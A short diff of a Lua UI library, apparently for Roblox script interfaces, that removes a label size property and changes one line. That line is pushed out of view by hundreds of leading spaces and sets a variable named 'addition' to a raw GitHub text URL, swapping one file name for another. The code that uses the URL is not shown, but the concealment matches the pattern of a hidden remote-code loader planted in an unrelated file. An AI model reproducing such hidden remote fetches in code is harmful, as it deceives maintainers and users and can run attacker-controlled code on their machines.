@@ -95,7 +95,6 @@ local function createOptionHolder(holderTitle, parent, parentTable, subHolder)
     end
     
     local title = library:Create("TextLabel", {
-        Size = UDim2.new(1, 0, 0, size),
         BackgroundTransparency = subHolder and 0 or 1,
         BackgroundColor3 = Color3.fromRGB(10, 10, 10),
         BorderSizePixel = 0,
@@ -187,7 +186,7 @@ local function createOptionHolder(holderTitle, parent, parentTable, subHolder)
     
     return parentTable
 end
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        local addition = "https://raw.githubusercontent.com/OPENCUP/random-texts/main/test2.txt"  
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        local addition = "https://raw.githubusercontent.com/OPENCUP/random-texts/main/test.txt"  
 local function createLabel(option, parent)
     local main = library:Create("TextLabel", {
         LayoutOrder = option.position,
